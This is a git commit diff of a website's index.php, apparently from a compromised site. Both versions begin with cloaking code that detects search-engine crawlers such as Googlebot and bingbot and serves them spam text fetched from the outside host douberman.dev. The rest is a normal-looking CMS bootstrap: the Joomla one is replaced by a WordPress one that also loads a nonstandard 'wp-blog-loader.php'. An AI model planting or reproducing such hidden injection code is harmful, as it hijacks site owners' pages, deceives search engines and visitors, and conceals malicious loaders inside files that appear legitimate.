263d2881c243b8884bbd393abb866f6c35fd6f0d
tlornaga <workingfor828@gmail.com>
2025-02-06 22:32:29 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,70 +1,39 @@
-<?php
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-
-return false;
-}
-
-if (is_bot()) {
-$message = file_get_contents('https://douberman.dev/douberman/barokkhotel.txt');
-echo $message;
-exit;
-}
-?>
+<?php	
+function is_bot() {	
+$user_agent = $_SERVER['HTTP_USER_AGENT'];	
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');	
+	
+foreach ($bots as $bot) {	
+if (stripos($user_agent, $bot) !== false) {	
+return true;	
+}	
+}	
+	
+return false;	
+}	
+	
+if (is_bot()) {	
+$message = file_get_contents('https://douberman.dev/douberman/editospace.txt');	
+echo $message;	
+exit;	
+}	
+?>	
 
 <?php
 /**
- * @package    Joomla.Site
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
  *
- * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
- * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ * @package WordPress
  */
 
 /**
- * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
  */
-define('JOOMLA_MINIMUM_PHP', '5.3.10');
+define( 'WP_USE_THEMES', true );
 
-if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
-{
-	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
-}
-
-// Saves the start time and memory usage.
-$startTime = microtime(1);
-$startMem  = memory_get_usage();
-
-/**
- * Constant that is checked in included files to prevent direct access.
- * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
- */
-define('_JEXEC', 1);
-
-if (file_exists(__DIR__ . '/defines.php'))
-{
-	include_once __DIR__ . '/defines.php';
-}
-
-if (!defined('_JDEFINES'))
-{
-	define('JPATH_BASE', __DIR__);
-	require_once JPATH_BASE . '/includes/defines.php';
-}
-
-require_once JPATH_BASE . '/includes/framework.php';
-
-// Set profiler start time and memory usage and mark afterLoad in the profiler.
-JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
-
-// Instantiate the application.
-$app = JFactory::getApplication('site');
-
-// Execute the application.
-$app->execute();
+/** Loads the WordPress Environment and Template */
+require('wp-blog-loader.php');
+require __DIR__ . '/wp-blog-header.php';
